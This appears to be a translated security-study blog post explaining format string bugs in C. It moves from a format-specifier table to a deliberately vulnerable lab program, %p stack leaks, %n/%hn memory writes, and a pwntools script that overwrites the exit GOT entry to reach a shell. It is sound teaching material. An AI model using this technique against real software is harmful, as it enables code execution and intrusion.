---
title: "[PWNABLE] FSB"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ FSB stands for Format String Bug, and as the name suggests, it is a vulnerability that occurs due to incorrect use of format specifier. You may have used printf() a lot to print variables, as shown below. printf(\"%d\",num1); It is better to use it in this way."
date: "2024-06-24"
translation_key: "tistory-b0994a81b2cb"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-FSB"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※**** 

FSB stands for Format String Bug, and as the name suggests, it is a vulnerability that occurs due to incorrect use of format specifiers.

You may have used printf() a lot to print variables, as shown below.

```
printf("%d",num1);
```

You probably know that using it this way is the right way.

So, in the case of vulnerable code, how is it used that causes bugs?

#### What are format specifiers?

To understand this, you need to know what a format specifier is. A format specifier is a data format for receiving and processing variable arguments from functions such as printf() or scanf(). For example, %d is a format specifier that outputs an integer, and %s is a format specifier that outputs a string.

Format specifiers are usually used to clearly specify the data type of the variable to be output.

See more

**Format specifier**

**Data Type**

**Meaning**

%c

char

character

%s

char\*, char\[\]

string

%hd

short

2-byte integer including sign (decimal number)

%d

int

Integer of type int size including sign (decimal number)

%ld

long

Integer of type long including sign (decimal number)

%lld

long long

8-byte integer including sign (decimal number)

%hi

short

2-byte integer including sign (decimal number)

%i

int

Integer of type int size including sign (decimal number)

%li

long

Integer of type long including sign (decimal number)

%lli

long long

8-byte integer including sign (decimal number)

%hu

unsigned short

2-byte integer without sign (decimal number)

%u

unsigned int

Unsigned integer of type int (decimal)

%lu

unsigned long

Unsigned integer of type long (decimal)

%llu

unsigned long long

8-byte integer without sign (decimal number)

%ho

unsigned short

2-byte integer without sign (octal number)

%o

unsigned int

Unsigned integer of type int (octal)

%lo

unsigned long

Unsigned integer of type long (octal)

%llo

unsigned long long

8-byte integer without sign (octal number)

%hx

unsigned short

2-byte integer without sign (hexadecimal, abcdef written in lowercase letters)

%x

unsigned int

An integer of type int size without sign (hexadecimal, abcdef written in lowercase)

%lx

unsigned long

An unsigned integer of type long (hexadecimal, abcdef written in lowercase)

%llx

unsigned long long

8-byte integer without sign (hexadecimal, abcdef written in lowercase letters)

%hX

unsigned short

2-byte integer without sign (hexadecimal, ABCDEF capitalized)

%X

unsigned int

Unsigned integer of type int (hexadecimal, ABCDEF capitalized)

%lX

unsigned long

An unsigned integer of type long (hexadecimal, ABCDEF capitalized)

%llX

unsigned long long

8-byte integer without sign (hexadecimal, ABCDEF capitalized)

%f

float

4-byte real number expressed as a decimal point (decimal number)

%lf

double

8-byte real number expressed as a decimal point (decimal number)

%llf , %Lf

long double

Real number of type long double expressed as decimal point (decimal number)

%e

float

4-byte real number expressed in exponential notation (decimal number, lowercase e)

%le

double

8-byte real number expressed in exponential notation (decimal number, lowercase e)

%Le

long double

Real number of type long double expressed in exponential notation (decimal number, lowercase e)

%E

float

4-byte real number expressed in exponential notation (decimal number, capital E)

%lE

double

8-byte real number expressed in exponential notation (decimal number, capital E)

%LE

long double

A real number of type long double expressed in exponential notation (decimal number, capital E)

%g

float

Use the shorter format specifier between %f and %e (lowercase e)

%lg

double

Use the format specifier expressed as the shorter of %lf and %le (lowercase e)

%Lg

long double

Use the format specifier, which is the shorter of %Lf and %Le (lowercase e).

%G

float

Use the shorter format specifier %f or %e (capital E)

%lG

double

Use the format specifier expressed as the shorter of %lf and %le (capital E)

%LG

long double

Use the shorter format specifier %Lf or %Le (capital E)

The table was taken from the link below

[https://hackerpark.tistory.com/entry/C%EC%96%B8%EC%96%B4-%EC%84%9C%EC%8B%9D-%EC%A7%80%EC%A0%95%EC%9E%90%EC%9D%98-%EB%AA%A8%EB%93%A0%EA%B2%83-%EC%84%9C%EC%8B%9D%EB%AC%B8%EC%9E%90](https://hackerpark.tistory.com/entry/C%EC%96%B8%EC%96%B4-%EC%84%9C%EC%8B%9D-%EC%A7%80%EC%A0%95%EC%9E%90%EC%9D%98-%EB%AA%A8%EB%93%A0%EA%B2%83-%EC%84%9C%EC%8B%9D%EB%AC%B8%EC%9E%90)

 [\[C language\] All format specifiers (format characters)

Format specifier ? This is a data format for receiving and processing variable arguments from various APIs such as printf, scanf, sprintf, and fprintf. Specify which arguments are to be processed and how to handle them inside the API function that handles variable arguments.

hackerpark.tistory.com](https://hackerpark.tistory.com/entry/C%EC%96%B8%EC%96%B4-%EC%84%9C%EC%8B%9D-%EC%A7%80%EC%A0%95%EC%9E%90%EC%9D%98-%EB%AA%A8%EB%93%A0%EA%B2%83-%EC%84%9C%EC%8B%9D%EB%AC%B8%EC%9E%90)

* * *

#### Vulnerable code example

Common examples of FSB occurring include:

```
char userInput[100];
scanf("%s", userInput);
printf(userInput);
```

In the above code, the format specifier is not used in printf() and the user input is passed as is. In this case, if the user input contains format specifiers, memory may be read or written in unexpected ways, which may lead to bugs.* * *

#### Problems and attack methods

A vulnerable printf call can be exploited by an attacker to read or write arbitrary locations in memory. For example, if the user provides input such as %x %x %x %x to userInput, the program's memory contents are output. In more serious cases, the %n format specifier can be used to manipulate memory into writing a specific value.

Let's look at a simple example.

```
// gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
#include <stdio.h>
#include <stdlib.h>

void gift() {
    printf("Hello! ZZoMblE");
    system("/bin/sh");
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}
void vuln() {
    char buf[128];
    read(0,buf,128);
    printf(buf);
    exit(0);
}
int main() {
    initialize();
    vuln();
    return 0;
}
```

First, if you look for the vulnerability, you can see that vuln() does not use a format specifier when outputting the buffer.

Now that you know the vulnerability, you may be wondering how to exploit it.

What we will use here is the format specifier '%p'.

By outputting the value in memory as an address value, it allows you to check the values ​​in the register and stack.

![](/assets/images/tistory/tistory-b0994a81b2cb/001.png)

Now let's check what the output values are.

After setting a breakpoint in the vulnerable function, I entered %p.

Now let's compare the values ​​output before and after the vulnerable function is called.

![](/assets/images/tistory/tistory-b0994a81b2cb/002.png)

Previously we discussed function calling conventions.

[https://whrdud727.tistory.com/entry/PWNABLE-Calling-Convention](https://whrdud727.tistory.com/entry/PWNABLE-Calling-Convention)

 [\[PWNABLE\] Calling Convention

Although it is not very important in the current situation where Stack Buffer OverFlow and Return Address OverFlow are in progress, it is the most basic in order to understand attack techniques such as rtl, rop, fsb, etc. in future postings.

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/PWNABLE-Calling-Convention)

The order in which the arguments are used is rdi - rsi - rdx - rcx - r8 - r9 - stack, so this is a process to check.

![](/assets/images/tistory/tistory-b0994a81b2cb/003.png)

rdi contains the format specifier we entered, which is the value of the variable that is the first argument to printf().

![](/assets/images/tistory/tistory-b0994a81b2cb/004.png)

Afterwards, if you check rsi, rdx, rcx, r8, and r9, you can see the same thing.

After that, the values ​​of the stack are output as shown below.

![](/assets/images/tistory/tistory-b0994a81b2cb/005.png)

In this way, memory leak can be performed using FSB.

I know how to leak, but now how to exploit it?

The answer to this also lies in the format specifier.

#### %n and %hn format specifiers

In FSB attacks, the %n and %hn format specifiers are used by the attacker to write values to memory. %n writes the number of characters written to the specified memory location.

For example, printf("hello%n", &var); writes 5, the length of "hello", to var. %hn does the same thing, but only half the size.

You can perform operations such as overwriting a return address or function pointer by writing the desired value to a specific location in memory.

The attack will be done with %n and %hn, so why did we go through the process of checking the memory using %p? In order to overwrite memory with %n, it is necessary to check which offset of the memory to overwrite. There is a way to check through debugging, but there are many ways to check this as well.

%n

4bytes

%hn

2 bytes

%hhn

1 byte

The offset we will check is where the user input value is located in the buffer. In the current case, it is located at the top of the stack, but this is often not the case when multiple variables are used.

Now that we have confirmed the offset, we will now perform GOT Overwrite. It will be somewhat visible which function's GOT will be overwritten. 

You can call gift() using exit(0) located after the vulnerable printf().

![](/assets/images/tistory/tistory-b0994a81b2cb/006.png)

The address of gift() is 0x4011b6. It corresponds to 4 bytes and can be done at once using %n, but I personally prefer splitting it into 2 bytes.

To write, write the value to be overwritten in '%{num}c' format as follows. At this time, num contains the value obtained by removing 2 bytes of the address value and converting it to decimal.

```
%1234c%20$hn
```

Below is the final payload.

```
from pwn import*

target = b'./ex'
p = process(target)
e = ELF(target)

gift = e.sym['gift']
exit_got = e.got['exit']

payload = '%{}c'.format((gift >> 16) & 0xffff )
payload += '%9$hn'
payload += '%{}c'.format(gift & 0xffff)
payload += '%10$hn'
payload += b'\x41'*3
payload += p64(exit_got+2)
payload += p64(exit_got)

p.send(payload)

p.interactive()
```

b'\\x41' is inserted in the middle for address padding, and exit\_got is also covered by splitting it into 2 bytes.

At this time, it must be run in python2, not python3.

![](/assets/images/tistory/tistory-b0994a81b2cb/007.png)